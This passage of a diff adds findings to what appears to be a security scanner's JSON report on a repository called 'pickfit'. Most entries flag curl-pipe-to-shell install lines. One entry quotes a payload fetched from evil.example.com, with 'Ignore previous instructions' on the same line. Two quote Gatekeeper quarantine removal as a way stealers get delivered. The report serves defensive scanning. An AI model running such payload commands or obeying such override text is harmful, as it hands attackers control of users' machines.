+      "file_sha256": "84455954fb33e0700cb72719a7f66e78b530e50f7cfe695ab199c66ce86b1380"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/oxi.json",
+      "line": 315,
+      "evidence": "curl -fsSL https://maziluiosif.github.io/oxi/install.sh | sh",
+      "file_sha256": "d884bebe150199cfe1b2f53eb4af0baabe06bbe80220c176a5c85def552b1ca8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/modeljars.json",
+      "line": 308,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/ModelJars/modeljars/main/install.sh",
+      "file_sha256": "fbfabf9d0bbc5ac85937c2ecce23f1da24408f1bc69f2e22fcb89ca74f0ff800"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/milk.json",
+      "line": 231,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/scoutme/milk/main/install.sh | sh",
+      "file_sha256": "af9ef56096e53122c572d4cef7892d80d3d450b3b829c57263fe0d3d65f88e09"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/nimbus.json",
+      "line": 363,
+      "evidence": "curl | sh",
+      "file_sha256": "1d0350b3043464e0cf7520e52e4efecc3b303736817a6514829e528c5189116f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/aletheia-mem.json",
+      "line": 121,
+      "evidence": "curl -fsSL https://bun.sh/install | bash",
+      "file_sha256": "b91cd15c1e6c9b693a34cd5032dd8d940464aada666acc9eaca83f6222fe80ef"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/all-code.json",
+      "line": 437,
+      "evidence": "curl -fsSL .../install.sh | sh",
+      "file_sha256": "40f84c29c63edc00bcadf79d628f93bb3dee37c5ab4f670a5de2d51f7409d452"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/nodeterm.json",
+      "line": 284,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/eneskirca/nodeterm/main/scripts/uni",
+      "file_sha256": "ad402655478ca13172be39a3f814b36d3c04f16ebdbaa9a654735fa4d637c402"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/autolith.json",
+      "line": 66,
+      "evidence": "curl -fsSL https://sh.lambda-symbolics.com/autolith | sh",
+      "file_sha256": "f32801a9e0b1640a4cd11a6c5256a4a9f4e260d2894e2dccbfe21d255143f683"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/moca.json",
+      "line": 546,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/adeotek/moca/main/install.sh | bash",
+      "file_sha256": "5cb4c06b04ea2fe3f0f1b5036a3591afce0a74676a1abe90422b3227deb0b28d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/penthera.json",
+      "line": 321,
+      "evidence": "curl http://evil.example.com/payload.sh | sh",
+      "file_sha256": "0ece6380cf34635f343f7c2d18a1ea2c0f780feadb96bc4c7c3db34b78103f19"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0003",
+      "summary": "Text tries to override the agent's earlier instructions",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/penthera.json",
+      "line": 321,
+      "evidence": "Ignore previous instructions",
+      "file_sha256": "0ece6380cf34635f343f7c2d18a1ea2c0f780feadb96bc4c7c3db34b78103f19"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/slotstream.json",
+      "line": 68,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/carloslfu/slotstream/main/install.s",
+      "file_sha256": "8558a3fccbc5f8ea2b088bb6d571f34c8dde039686a63bc8fc68325dda65d45e"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/dlgo.json",
+      "line": 290,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "e460830e24117f88c413ef31d3ec7931c917185a05b9ed4e2f8bcf19a39da5fa"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mcp-for-blender.json",
+      "line": 574,
+      "evidence": "curl -LsSf https://www.mcp-for-blender.com/install.sh | sh",
+      "file_sha256": "85a41c55268248d9597c8c4bea0d07365826a1186d2115737aa8f8029833a738"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/meilisearch.json",
+      "line": 328,
+      "evidence": "curl -L https://install.meilisearch.com | sh",
+      "file_sha256": "9ed907ba53a5f7b68e6bfe718b6a91a1306cfe7df44c2968afbfda63b9d25bcc"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/filo.json",
+      "line": 220,
+      "evidence": "curl -LsSf https://raw.githubusercontent.com/matteodante/filo/main/install.sh | ",
+      "file_sha256": "01318c08299218f4eda7c9559c76c1919df258d505b59d60dcdc5e7adc1a9387"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/dolt.json",
+      "line": 365,
+      "evidence": "curl -L .../install.sh | bash",
+      "file_sha256": "5cd21ad2fe881bbc719019633d390df678fe2a786298e6a0017a8838be7d1fae"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/covate.json",
+      "line": 100,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/SunflowersLwtech/covate/main/script",
+      "file_sha256": "32e1cad8776bbcab5f36122b1fafd04a9525b968d571c0c5b2d428eff33839de"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/vibes-plug.json",
+      "line": 472,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/roedyrustam/vibes-plug/main/install",
+      "file_sha256": "afd0bc93ddbff7e3e6351c9703e1014df16c393206937740042475903686e3cb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/watcher.json",
+      "line": 66,
+      "evidence": "curl -fsSL https://github.com/shaheeranser/watcher/releases/latest/download/inst",
+      "file_sha256": "e30c970bff192b62d1c302e2adacb8d6af4c868cd2deabe69cef49c98f36165a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/lazydocker.json",
+      "line": 192,
+      "evidence": "curl .../install_update_linux.sh | bash",
+      "file_sha256": "8f9642def8b8944f3e77be72b73559ee12da47c7023cec078a758cb7cd9bab6e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/superfluid.json",
+      "line": 563,
+      "evidence": "curl -fsSL https://superfluid.sh/install.sh | sh",
+      "file_sha256": "3a08a0a8e0dbb53b6243722133ca423e5a49e481790f01e7fe1690020e8a2223"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/grob.json",
+      "line": 1098,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/azerozero/grob/main/scripts/install",
+      "file_sha256": "8871e3160b4d990ecd3b7bf7366dd0939dc846b18cc85da81714221f4a13f118"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/noodle.json",
+      "line": 88,
+      "evidence": "curl -LsSf https://noodlerest.dev/install.sh | sh",
+      "file_sha256": "057d8426b004c7bd270fb1e63968a4bbf8ac85c989fa7b7d55545a3d64fe16e8"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mise.json",
+      "line": 165,
+      "evidence": "curl -fsSL https://mise.run | sh",
+      "file_sha256": "7ccb1bdee49a2ca9f3cc6855eda9bd4b60cbca756a3d0f1aa6af7c20f903febe"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/opstrellis.json",
+      "line": 360,
+      "evidence": "curl -fsSL ... | bash",
+      "file_sha256": "2e81d9c250798cde518f096d454f009ac11a01e9cb838db51faeb9c46c4f46b6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/termul.json",
+      "line": 328,
+      "evidence": "curl -fsSL ... | bash",
+      "file_sha256": "855e35862c8966077e02d2ccab3cf6176c2a7f4e32820fd9de35b44a764e300a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/patent.json",
+      "line": 78,
+      "evidence": "curl --proto '=https' --tlsv1.2 -LsSf https://github.com/r14dd/patent/releases/l",
+      "file_sha256": "a47a92e3824d739e4030e8b47c5432deaea9cd0e2194736686d134dbcd6fa24c"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/vtcode.json",
+      "line": 264,
+      "evidence": "curl ... install.sh | bash",
+      "file_sha256": "9b23055c722cddd061eb8569ddfde1e1f1ad72a0bb57f9f936fa3f688a43643f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/cluaiz.json",
+      "line": 392,
+      "evidence": "curl -fsSL https://cluaiz.com/install.sh | sh",
+      "file_sha256": "166088ebec1458ce767437caa2bdffd6cf012322441e862d44a5e9e5e98dbb2d"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/supercli.json",
+      "line": 231,
+      "evidence": "curl -sSL .../v0.2.1-machin/install.sh | bash",
+      "file_sha256": "a96ae8eaefc4cf0ea2d1a71c236a5bdf6d36130e3c34edd0ed0dec7e81184577"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/bastra-recall.json",
+      "line": 492,
+      "evidence": "curl -fsSL https://bastra.io/install | bash",
+      "file_sha256": "6e9f990ca8ca33f93ac70b3744cbce9e948420086e63ed48644577c671dc751f"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/cli.json",
+      "line": 329,
+      "evidence": "curl installer script | sh",
+      "file_sha256": "800cba8bf9036f3616a2202463f22aa3439f8c8d6fd78b2b0945d4246e626820"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/autonomous-grid.json",
+      "line": 177,
+      "evidence": "curl -fsSL https://grid.autonomous.ai/install.sh | bash",
+      "file_sha256": "5bd874eed327b121c1b79370fe2a726c652d5a80c170df64ef92376ca6c871de"
+    },
+    {
+      "severity": "high",
+      "id": "AGT-R-0105",
+      "summary": "Strips macOS Gatekeeper quarantine from a downloaded file (ClawHavoc-style stealer delivery)",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/lilbee.json",
+      "line": 538,
+      "evidence": "xattr -d com.apple.quarantine",
+      "file_sha256": "375108a7f1ef71ef1069f8e114a90068b528d5970039954e7771f6af4f893009"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/hipfire.json",
+      "line": 65,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/warpfront/hipfire/v0.4.5/scripts/in",
+      "file_sha256": "0287bf54aa65b986679a1e96c5bda1b3e7c228cf08ac8385ea264d390101b133"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/crow.json",
+      "line": 641,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/nibor1896/Crow/main/install.sh | ba",
+      "file_sha256": "af76bab5ad4f70f2461e74c6aed76b7cc789de114f50ef34e70429b1fbf92921"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/coop.json",
+      "line": 69,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/trailofbits/coop/main/install.sh | ",
+      "file_sha256": "7b813254ee834664a0c4e0f1022f37f685c1e00d15c9e8706aaadf01c8c60af4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/omm.json",
+      "line": 713,
+      "evidence": "curl -fsSL https://omm.run/install.sh | sh",
+      "file_sha256": "5e9518e93433626d5e558a8f63863eabe05aa5bfc4cace067bce12e5b15b3f6e"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/yottacode.json",
+      "line": 180,
+      "evidence": "curl -fsSL https://yottacode.ai/cli/install.sh | bash",
+      "file_sha256": "7cdaac0fa746a58af7f899b51de296307ade735e760e9a053086f23d7c78b0e3"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/bloomery.json",
+      "line": 207,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/midagedev/bloomery/main/tools/relea",
+      "file_sha256": "223bb21d15352e5a548d918dd3f1f459c48762abca147b6d4e0979d213e020e7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/motita.json",
+      "line": 192,
+      "evidence": "curl -fsSL https://motita.kodingvibes.com/install.sh | sh",
+      "file_sha256": "061dcf91203d6c9fa117c624ed5415ccb29d57c8684bad8dbbe893cb97b5125b"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/camelid.json",
+      "line": 394,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/timtoole02/Camelid/main/scripts/get",
+      "file_sha256": "f4980ed67b4c63a0489f9a9e96be4b5b4febc1659e5f05787f78f08701e76877"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/wtfi2.json",
+      "line": 242,
+      "evidence": "curl ... | sh",
+      "file_sha256": "420093f7626719278ef0a66220702c3effd6900b52b91276e400eed54bc5f498"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/code-cortex-mcp.json",
+      "line": 504,
+      "evidence": "curl -fsSL ... | bash",
+      "file_sha256": "ab19a0afac802a0f7600696399bc2d199c9dd46544fb21ee81fcb86f33995192"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/pooprusteek.json",
+      "line": 103,
+      "evidence": "curl -fsSL https://github.com/Aver005/pooprusteek/releases/latest/download/insta",
+      "file_sha256": "fe701608f9e67be0ecd4c202f87f48bc29e92e6c62113ad006cad8f51e9e50e9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/lucius-mcp.json",
+      "line": 716,
+      "evidence": "curl -LsSf https://astral.sh/uv/install.sh | sh",
+      "file_sha256": "1708a08646c1b029011f422299d0c7af2899c79a3c9281166c6ddb5d32b761e2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/k9s.json",
+      "line": 1105,
+      "evidence": "curl -sS https://webinstall.dev/k9s | bash",
+      "file_sha256": "9c31b5c96381d20a601c73664e492789ef9668e8d0a95600f07a6204893e83ed"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/llama-gui.json",
+      "line": 193,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/thomas9120/LLama-GUI/main/online_in",
+      "file_sha256": "8994a19bad062fe5a606ed7b28271fe6a87bf9b0dbf33bc2807699bc6c8371d2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/mole.json",
+      "line": 1094,
+      "evidence": "curl -fsSL https://raw.githubusercontent.com/tw93/Mole/linux/install.sh | bash",
+      "file_sha256": "aa9bf69f43e53ed59f3703522d059c21d1837f5f2aa8e6c5f5e35301ccfefbdf"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/hako.json",
+      "line": 212,
+      "evidence": "curl -fsSL https://mithraeums.github.io/hakm.sh | sh",
+      "file_sha256": "9f918ef8666c4d2b307c0575970b3af72d271a377861369fba8e4ae486653745"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/taracode.json",
+      "line": 186,
+      "evidence": "curl -fsSL https://code.tara.vision/install.sh | bash",
+      "file_sha256": "f7d7c11e7c6008ffa663f4f4117b6291c71fc20636ac61a20b8b39c2647ed0b4"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/privateer-agent.json",
+      "line": 1044,
+      "evidence": "curl -fsSL https://privateer.pro/install.sh | sh",
+      "file_sha256": "945fd5cc2121de8e49b7e06a019720e9fca30fa3cc0cc8f7335a90bd3023e2a7"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/data/software/local-ai-agent.json",
+      "line": 220,
+      "evidence": "curl -LsSf https://raw.githubusercontent.com/ilvy23/local-ai-agent/main/install.",
+      "file_sha256": "75196601138f1cf0ebb4d81ebad40c16d27321e05de60f1602f61b6503de38ca"
+    },
+    {
+      "severity": "low",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/v2/test_v2_eval.py",
+      "line": 171,
+      "evidence": "curl -fsSL https://example.com/x.sh | sh",
+      "file_sha256": "bb13fa459f312e6c03d49c81770fc2e6a663a0355a093491eb09d157373e341a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/v2/README.md",
+      "line": 28,
+      "evidence": "curl | sh",
+      "file_sha256": "abef94ad0f4f141a24fbec69e40f74647d43011c0569f2d437d0bd3ba14f1c13"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/grades/claude-B.jsonl",
+      "line": 8,
+      "evidence": "curl install.sh | sh",
+      "file_sha256": "fa84b8482525bc20730f141603df884fe53f1e94e63ef93450135b4c5f97bb31"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/grades/claude-A.jsonl",
+      "line": 20,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "ed0052608ec28cfb54a2a9ece1f7cb7c49da43d95de3830de05556863f1a1ff2"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/answers-B/picks-extracted.csv",
+      "line": 10,
+      "evidence": "curl install.sh | sh",
+      "file_sha256": "9e7229bfb87cd95f9f9eaf3e16e529fe1ec873a28ecce927040cea1e513fd090"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/answers-B/answers.jsonl",
+      "line": 5,
+      "evidence": "curl -sSf https://atlasgo.sh | sh",
+      "file_sha256": "862e6796feae7ef1a8e3f9c124f9279b655499a5c8c80c81134ae1cfc10101f6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/answers-B/picks.csv",
+      "line": 10,
+      "evidence": "curl install.sh | sh",
+      "file_sha256": "1349e044c1d8e0417adaad1dc5094d85d7e6c652b8ef3ef40abe908a7d5452a6"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/answers-B/picks-extract.jsonl",
+      "line": 8,
+      "evidence": "curl install.sh | sh",
+      "file_sha256": "4edbd7e82988578af7e53bada7ddd65eefd59f6f7755758f84588a741e5a33c9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/l1-C6/l1-batch.jsonl",
+      "line": 1,
+      "evidence": "curl \\\\| sh",
+      "file_sha256": "518d02258ad5d2a0efa22c11f6cc61c922f278707adfdf341f937b157fa727fa"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/l1-B/l1-form.csv",
+      "line": 9,
+      "evidence": "curl install.sh | sh",
+      "file_sha256": "2e4d81d9f07e0f0d9023657b2be017e32df362be488b18bae315b74c28f46c70"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/l1-B/l1-batch.jsonl",
+      "line": 8,
+      "evidence": "curl install.sh | sh",
+      "file_sha256": "ac2d11549947d692fd73bb340a0328bfe3039107359a9ed5cccde30fe063742a"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/l1-A/l1-form.csv",
+      "line": 7,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "7e3ccc005a92f2d2a8f7e5f6d13dc87931d8784740f2cfc4dd65fac351e929eb"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/l1-A/l1-batch.jsonl",
+      "line": 6,
+      "evidence": "curl -fsSL https://ollama.com/install.sh | sh",
+      "file_sha256": "157ef2ba2f94b8c6d0976c57d959301f9b2f5c1750998ed388a8c26b7fe2b0b9"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/answers-A/picks-extracted.csv",
+      "line": 2,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "b85810dcd8f82f478e0f8ff56a4f79b7bcae5ac4a9b5c57d8920895883242b49"
+    },
+    {
+      "severity": "medium",
+      "id": "AGT-R-0102",
+      "summary": "Downloads a script and pipes it straight into a shell",
+      "path": "pickfit-1d77f3fb3227ac8d7f3a5b18d89c073ab9cf9a51/eval/results/blind/answers-A/answers.jsonl",
+      "line": 1,
+      "evidence": "curl https://install.duckdb.org | sh",
+      "file_sha256": "21051d81cb2d48438fea5e5287ba283b3c21a33a61fe8b71720a9ef2e5bb7d4d"
+    },
+    {
+      "severity": "medium",
